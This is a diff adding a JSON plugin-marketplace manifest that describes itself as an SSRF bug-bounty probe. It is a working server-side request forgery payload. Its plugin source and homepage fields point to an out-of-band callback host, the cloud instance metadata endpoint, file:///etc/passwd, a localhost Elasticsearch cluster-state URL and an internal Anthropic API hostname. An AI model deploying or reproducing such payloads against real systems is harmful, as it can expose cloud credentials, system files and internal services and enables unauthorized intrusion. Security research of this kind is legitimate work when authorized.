@@ -1,0 +1,70 @@
+{
+  "name": "ssrf-probe-058",
+  "description": "SSRF research probe — bug bounty by liamconner10",
+  "owner": {"name": "research", "email": "liamconner10@gmail.com"},
+  "plugins": [
+    {
+      "name": "ssrf-probe-1",
+      "description": "url type",
+      "category": "research",
+      "source": {
+        "source": "url",
+        "url": "http://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/mp-source-url-058"
+      }
+    },
+    {
+      "name": "ssrf-probe-2",
+      "description": "git-subdir type",
+      "category": "research",
+      "source": {
+        "source": "git-subdir",
+        "url": "http://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/mp-source-gitsubdir-058",
+        "path": "plugins/x",
+        "ref": "main"
+      }
+    },
+    {
+      "name": "ssrf-probe-3-imds",
+      "description": "imds probe",
+      "category": "research",
+      "source": {
+        "source": "url",
+        "url": "http://169.254.169.254/latest/meta-data/"
+      }
+    },
+    {
+      "name": "ssrf-probe-4-file",
+      "description": "file probe",
+      "category": "research",
+      "source": {
+        "source": "url",
+        "url": "file:///etc/passwd"
+      }
+    },
+    {
+      "name": "ssrf-probe-5-localhost",
+      "description": "localhost probe",
+      "category": "research",
+      "source": {
+        "source": "url",
+        "url": "http://localhost:9200/_cluster/state"
+      }
+    },
+    {
+      "name": "ssrf-probe-6-internal",
+      "description": "internal anthropic",
+      "category": "research",
+      "source": {
+        "source": "url",
+        "url": "http://internal.api.anthropic.com/whoami"
+      }
+    },
+    {
+      "name": "ssrf-probe-7-homepage",
+      "description": "homepage field probe",
+      "category": "research",
+      "homepage": "http://d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/mp-plugin-homepage-058",
+      "source": "./plugin-7"
+    }
+  ]
+}
